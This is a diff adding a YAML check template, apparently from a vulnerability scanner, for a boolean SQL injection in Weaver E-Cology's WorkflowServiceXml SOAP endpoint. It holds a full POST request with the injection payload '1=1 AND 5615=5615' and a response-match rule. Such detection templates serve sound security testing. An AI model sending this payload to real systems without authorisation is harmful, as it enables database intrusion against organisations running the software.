@@ -1,0 +1,27 @@
+name: 泛微E-Cology-WorkflowServiceXml-SQL注入
+description: >
+  布尔注入
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: POST
+    path: /services/WorkflowServiceXml
+    headers:
+      Content-Type: text/xml
+    body: |
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://webservices.workflow.weaver"> <soapenv:Header/>
+                  <soapenv:Body>
+                      <web:getHendledWorkflowRequestList>
+                        <web:in0>1</web:in0>
+                        <web:in1>1</web:in1>
+                        <web:in2>1</web:in2>
+                        <web:in3>1</web:in3>
+                        <web:in4>
+                            <web:string>1=1 AND 5615=5615</web:string>
+                        </web:in4>
+                      </web:getHendledWorkflowRequestList>
+                  </soapenv:Body>
+                </soapenv:Envelope>
+    expression:
+      status: 200
+      body_all: ["WorkflowRequestInfo"] 
